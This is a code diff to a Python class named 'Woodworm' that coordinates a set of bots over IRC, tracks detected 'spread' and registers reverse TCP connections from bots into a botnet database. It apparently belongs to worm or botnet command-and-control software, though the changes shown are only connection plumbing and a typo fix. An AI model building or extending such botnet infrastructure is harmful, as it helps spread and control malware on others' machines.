@@ -26,8 +26,9 @@ class Woodworm:
         self.myContext.set_connected(True)
 
         self.tcp_server = tcp_services.TCPServer(self.my_ip, self.tcpPort)        
+        self.tcp_server.onConnectionRegistered.subscribe(self.tcpServer_onConnectionReceived)
+
         self.irc_connection = irc_service.IRCConnection(self.ircServer, self.domain, self.ircServerPort, self.ircNick, self.channel)
-        
         self.irc_connection.onConnected.subscribe(self.irc_onConnected)
         self.irc_connection.onBroadcastRequested.subscribe(self.irc_onBroadcastRequested)
         self.irc_connection.onSpreadDetected.subscribe(self.irc_onSpreadDetected)
@@ -73,7 +74,7 @@ class Woodworm:
         if self.botnetDB.get_bot(nick) is None:
             bot = context.Context(nick, ip, port)
             tcpClient = tcp_services.TCPClient(ip, port)
-            bot.set_tcp__connection(await tcpClient.connect())
+            bot.set_tcp_connection(await tcpClient.connect())
             bot.set_connected(True) 
             self.botnetDB.add_bot(bot)
             
@@ -139,6 +140,19 @@ class Woodworm:
             self.syslog.log(f"Error getting file info: {str(e)}", level=logger.LogLevel.ERROR)
             return None
         
+
+    async def tcpServer_onConnectionReceived(self, *args, **kwargs):
+        nick = kwargs.get('sender')
+        connection = kwargs.get('connection')
+        
+        bot = self.botnetDB.get_bot(nick)
+        if bot is None:
+            self.syslog.log(f"Bot not found: nick: {nick}", level=logger.LogLevel.ERROR)
+            return
+        
+        bot.set_reversed_tcp_connection(connection)
+        self.syslog.log(f"Reverse connection established with bot: nick: {nick}", level=logger.LogLevel.INFO)
+
 
     async def another_loop(self):
         while True:
